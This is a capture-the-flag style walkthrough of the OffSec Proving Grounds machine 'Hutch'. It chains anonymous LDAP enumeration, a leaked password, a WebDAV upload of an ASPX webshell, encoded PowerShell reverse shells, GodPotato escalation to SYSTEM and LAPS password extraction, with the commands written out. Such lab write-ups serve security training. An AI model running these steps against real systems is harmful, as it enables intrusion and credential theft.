# Hutch — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## TL;DR

Identify user `fmcsorley` password in LDAP description → Authenticate to WebDAV on IIS → Upload `cmd.aspx` webshell → Reverse shell → Abuse `SeImpersonatePrivilege` with GodPotato to NT AUTHORITY\SYSTEM → Extract LAPS password from LDAP to access Domain Admin.

---

## Enumeration

```bash
nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.178.122
```

**Open Ports:**
- **53, 88, 135, 139, 445**: Standard AD services
- **389, 636, 3268, 3269**: LDAP
- **5985**: WinRM
- **80**: HTTP (Microsoft IIS/10.0) with WebDAV enabled.

Domain: `hutch.offsec`

Running an unauthenticated LDAP search can sometimes leak massive amounts of domain information if anonymous binding is permitted.
```bash
ldapsearch -x -H ldap://192.168.178.122 -D '' -w '' -b "DC=hutch,DC=offsec"
```

Filtering through the output, we find the account for `Freddy McSorley`. The "description" attribute contains a horrific security violation:
`description: Password set to CrabSharkJellyfish192 at user's request. Please change on next login.`

We now have valid credentials: **`fmcsorley:CrabSharkJellyfish192`**.

---

## Initial Foothold — WebDAV Application Upload

Port 80 is running WebDAV, a set of extensions to HTTP that allows users to collaboratively edit and manage files.

Using the tool `cadaver`, we can log in to the WebDAV service with our newly found credentials:
```bash
cadaver 192.168.178.122
# Authenticate as fmcsorley
```

Once connected, we verify that this WebDAV directory maps directly to the webroot. Because IIS natively executes ASP/ASPX files, we upload an ASPX webshell (like `cmd.aspx` from SecLists/fuzzdb).
```text
dav:/ /> put cmd.aspx
```

Navigating to `http://192.168.178.122/cmd.aspx` confirms RCE. We execute a PowerShell reverse shell payload and catch our callback.

---

## Privilege Escalation — GodPotato to SYSTEM

Checking our privileges on the target:
```cmd
whoami /priv
```
`SeImpersonatePrivilege` is enabled! This is the hallmark of IIS service accounts.

We transfer `GodPotato-NET4.exe` to the machine. GodPotato is perfect for newer Windows builds where PrintSpoofer or JuicyPotato may fail.

```cmd
.\GodPotato-NET4.exe -cmd "cmd /c powershell -e JABj..."
```
*(Executing a secondary encoded reverse shell payload).*

Our second listener catches a shell as **NT AUTHORITY\SYSTEM**.

---

## Post Exploitation — LAPS Password Extraction

While we have SYSTEM on the web server, we are not fully Domain Admin. However, enumerating the domain reveals the presence of **LAPS (Local Administrator Password Solution)**.

Since we effectively control the machine, we can query LDAP explicitly for the LAPS password of Domain Controllers or other high-value targets, assuming our current context or extracted rights permit it.

Run LDAP search utilizing our original credentials or SYSTEM context to query `ms-MCS-AdmPwd`:
```bash
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.236.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
We retrieve the cleartext LAPS password: `Mu06]34dAM27fP`.
Using this password with `evil-winrm` or `psexec` grants full administrative access. 🎉

---

## Key Takeaways

- **LDAP Anonymous Bind:** If enabled, LDAP can dump the entire domain tree. Always check the `description` fields for carelessly placed initial passwords.
- **IIS WebDAV Validation:** If you find WebDAV, obtaining credentials often guarantees a webshell upload vector since it's designed for file management over HTTP.
- **SeImpersonate + GodPotato:** The modern standard for escaping IIS restricted shells to SYSTEM.
- **LAPS:** LAPS passwords are stored in AD. If permissions are misconfigured, any authenticated user can read `ms-MCS-AdmPwd` in cleartext.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
